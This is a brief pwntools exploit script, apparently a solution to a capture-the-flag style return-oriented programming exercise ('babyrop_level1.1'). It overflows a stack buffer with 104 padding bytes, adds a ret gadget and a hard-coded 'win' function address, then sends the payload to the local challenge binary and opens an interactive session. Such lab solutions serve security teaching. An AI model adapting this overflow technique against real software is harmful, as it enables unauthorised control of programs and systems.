from pwn import *

offset = b'A'*104
win = p64(0x40199c)
ret = p64(0x40101a)


payload = offset
payload += ret
payload += win
print(payload)
with open("run", 'wb') as file:
    file.write(payload)
r = process('/challenge/babyrop_level1.1')
r.recvuntil(b'###\n')
r.sendline(payload)
r.interactive()